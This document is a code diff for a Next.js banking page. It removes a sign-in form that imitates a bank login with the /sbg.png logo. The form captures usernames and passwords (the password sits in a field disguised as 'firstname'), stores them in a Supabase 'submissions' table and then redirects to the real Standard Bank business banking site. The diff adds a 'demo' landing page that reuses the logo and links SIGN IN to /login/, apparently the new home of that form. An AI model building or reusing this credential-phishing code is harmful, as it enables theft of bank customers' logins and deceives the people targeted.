@@ -1,98 +1,53 @@
-"use client";
+import Link from "next/link";
 
-import { FormEvent, useState } from "react";
-import { createClient, isSupabaseConfigured } from "@/utils/supabase/client";
-
-const finalLink = "https://onlinebusinessbanking.standardbank.co.za/#/landing-page";
-const LOADING_DELAY_MS = 2500;
-
-export default function Home() {
-  const [message, setMessage] = useState("");
-  const [isLoading, setIsLoading] = useState(false);
-
-  async function submitDetails(event: FormEvent<HTMLFormElement>) {
-    event.preventDefault();
-    const form = new FormData(event.currentTarget);
-    const username = String(form.get("username") ?? "").trim();
-    const firstname = String(form.get("firstname") ?? "").trim();
-
-    if (!username || !firstname) {
-      setMessage("Enter your username and first name.");
-      return;
-    }
-
-    if (!isSupabaseConfigured) {
-      setMessage("Supabase is not configured yet.");
-      return;
-    }
-
-    setIsLoading(true);
-
-    try {
-      const supabase = createClient();
-      const { error } = await supabase.from("submissions").insert({
-        username,
-        firstname,
-        submitted_at: new Date().toISOString(),
-      });
-
-      if (error) throw error;
-    } catch {
-      setIsLoading(false);
-      setMessage("The details could not be saved. Try again.");
-      return;
-    }
-
-    window.setTimeout(() => window.location.assign(finalLink), LOADING_DELAY_MS);
-  }
-
+export default function LandingPage() {
   return (
-    <main className="login-page">
-      {isLoading && (
-        <div className="loading-overlay" role="status" aria-live="polite">
-          <span className="loading-spinner" aria-hidden="true" />
-          <span>Loading...</span>
+    <main className="demo-landing-page">
+      <header className="demo-landing-header" aria-label="Demo banking header">
+        <div className="demo-landing-brand" aria-label="Zudda Demo Banking">
+          <img src="/sbg.png" alt="" />
         </div>
-      )}
-      <section className="login-shell" aria-labelledby="sign-in-title">
-        <img className="brand-logo" src="/sbg.png" alt="Company logo" />
+        <span className="demo-contact">
+          <span className="demo-contact-icon" aria-hidden="true" />
+          Contact Us
+        </span>
+      </header>
 
-        <form className="login-card" onSubmit={submitDetails} noValidate aria-busy={isLoading}>
-          <h1 id="sign-in-title">Sign in</h1>
+      <section className="demo-landing-split" aria-label="Demo banking landing page">
+        <div className="demo-landing-image-panel">
+          <img src="/login-landing-pc.jpg" alt="" />
+        </div>
 
-          <label className="field">
-            <span className="sr-only">Username</span>
-            <input
-              name="username"
-              type="text"
-              placeholder="Username"
-              autoComplete="username"
-              onInput={() => setMessage("")}
-            />
-          </label>
+        <div className="demo-landing-actions">
+          <div className="demo-action-center">
+            <h2>Sign in to online banking</h2>
+            <p className="demo-register-copy">
+              If you don't have an online profile, please register
+            </p>
 
-          <label className="field firstname-field">
-            <span className="sr-only">First name</span>
-            <input
-              name="firstname"
-              type="password"
-              placeholder="Password"
-              autoComplete="given-name"
-              onInput={() => setMessage("")}
-            />
-          </label>
+            <div className="demo-action-buttons">
+              <Link className="demo-signin-button" href="/login/">
+                SIGN IN
+              </Link>
+              <button className="demo-register-button" type="button">
+                REGISTER
+              </button>
+            </div>
 
-          <p className="form-message" role="alert">{message}</p>
+            <p className="demo-terms">
+              By signing in, I agree to the <span>T&amp;Cs</span>
+              <br />
+              Last updated in June 2025
+            </p>
 
-          <button className="primary-button" type="submit">SIGN IN</button>
-          <button className="secondary-button" type="button">REGISTER</button>
+            <p className="demo-invitation">
+              Received an invitation for online banking?
+              <br />
+              <span>START HERE</span>
+            </p>
+          </div>
 
-          <nav className="recovery-links" aria-label="Account recovery">
-            <span className="recovery-action">Forgot password</span>
-            <span aria-hidden="true">|</span>
-            <span className="recovery-action">Forgot username</span>
-          </nav>
-        </form>
+        </div>
       </section>
     </main>
   );
